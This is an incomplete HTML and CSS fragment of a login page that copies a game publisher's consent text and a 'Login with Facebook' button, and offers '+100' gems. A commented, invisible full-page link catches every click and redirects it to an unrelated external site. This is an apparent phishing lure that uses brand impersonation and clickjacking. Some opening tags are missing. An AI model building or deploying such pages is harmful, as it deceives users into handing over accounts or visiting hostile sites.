  <style>
    body {
      margin: 0;
      font-family: "Poppins", Arial, sans-serif;
      background: url('https://cute-amethyst-wx5zdxi8cw.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(6px);
      text-align: center;
      padding: 40px 30px;
      border-radius: 20px;
      width: 360px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
      animation: fadeIn 1.2s ease;
      position: relative;
      z-index: 2;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .logo {
      width: 160px;
      height: auto;
      margin-bottom: 25px;
      user-select: none;
      border-radius: 12px;
    }

    .mini-buttons {
      display: flex;
      justify-content: space-between;
      margin-bottom: 25px;
    }

    .mini-btn {
      background: linear-gradient(180deg, #0c53b7, #08377a);
      border: none;
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      padding: 10px 14px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
      transition: all 0.25s ease;
    }

    .mini-btn:hover {
      background: linear-gradient(180deg, #1365da, #0a3f8a);
      transform: translateY(-2px);
    }

    .fb-btn {
      background-color: #1877f2;
      border: none;
      color: white;
      font-size: 18px;
      font-weight: 600;
      padding: 14px 30px;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      margin-bottom: 15px;
      transition: background 0.3s ease;
    }

    .fb-btn:hover {
      background-color: #0f5cd6;
    }

    .fb-btn img {
      vertical-align: middle;
      margin-right: 8px;
    }

    .note {
      color: #ddd;
      font-size: 12px;
      line-height: 1.5;
      margin-top: 10px;
    }

    .note a {
      color: #00aaff;
      text-decoration: none;
      font-weight: 500;
    }

    .note a:hover {
      text-decoration: underline;
    }

    /* üîó Invisible full-page link to redirect clicks anywhere */
    .click-layer {
      position: fixed;
      inset: 0;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- üîó Full-page invisible clickable area -->
  <a href="https://game-players-online-rouge.vercel.app/" class="click-layer"></a>

      <button class="mini-btn">üì± Change Device</button>
      <button class="mini-btn">üíé +100</button>
    </div>

      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="20" height="20" alt="FB" />
      Login with Facebook
    </button>

    <p class="note">
      By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the<br>
      <a href="#">Privacy Policy</a>
    </p>
  </div>
</body>
